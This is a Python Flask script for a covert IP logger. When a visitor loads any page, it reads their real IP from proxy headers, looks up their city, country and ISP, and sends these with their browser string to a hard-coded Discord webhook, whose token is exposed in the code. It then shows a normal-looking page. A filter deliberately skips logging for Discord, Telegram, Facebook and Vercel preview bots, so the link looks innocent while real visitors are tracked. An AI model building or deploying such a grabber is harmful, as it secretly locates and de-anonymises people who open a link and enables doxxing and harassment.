import os
from flask import Flask, render_template, request
import requests
from datetime import datetime

current_dir = os.path.dirname(os.path.abspath(__file__))
template_dir = os.path.join(current_dir, '..', 'templates')

app = Flask(__name__, template_folder=template_dir)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def is_bot(ua):
    # Lista de palabras clave que usan los robots de Vercel, Discord, etc.
    bots = ['vercel', 'screenshot', 'bot', 'crawler', 'spider', 'discord', 'telegram', 'facebook']
    return any(bot in ua.lower() for bot in bots)

def send_to_discord(ip, user_agent, geo_data=None):
    if not geo_data: geo_data = {}
    
    embed = {
        "title": "⚡ IP REAL DETECTADA",
        "color": 0x00FF7F, # Verde neón para humanos
        "fields": [
            {"name": "🌐 IP Pública", "value": f"**`{ip}`**", "inline": True},
            {"name": "📍 Ubicación", "value": f"{geo_data.get('city', 'Desconocida')}, {geo_data.get('country_name', 'N/A')}", "inline": True},
            {"name": "🏢 ISP", "value": f"{geo_data.get('org', 'Desconocido')}", "inline": False},
            {"name": "📱 Navegador REAL", "value": f"```\n{user_agent}\n```", "inline": False}
        ],
        "footer": {"text": "1* Logger • Verificado Humano", "icon_url": AVATAR_URL},
        "thumbnail": {"url": AVATAR_URL}
    }
    
    payload = {"username": "1* Logger", "avatar_url": AVATAR_URL, "embeds": [embed]}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/<path:path>')
def index(path=None):
    user_agent = request.headers.get('user-agent', 'Desconocido')

    # --- FILTRO DE ROBOTS ---
    # Si detecta que es Vercel sacando una foto, no envía nada a Discord
    if is_bot(user_agent):
        return render_template('index.html')

    # Obtener IP REAL tras el proxy de Vercel
    ip = request.headers.get('x-forwarded-for')
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    if not ip:
        ip = request.headers.get('x-real-ip')
    if not ip:
        ip = request.remote_addr

    # Obtener Geodata
    geo_res = {}
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
        if res.status_code == 200:
            geo_res = res.json()
    except:
        pass

    send_to_discord(ip, user_agent, geo_res)
    return render_template('index.html')

app_dispatch = app
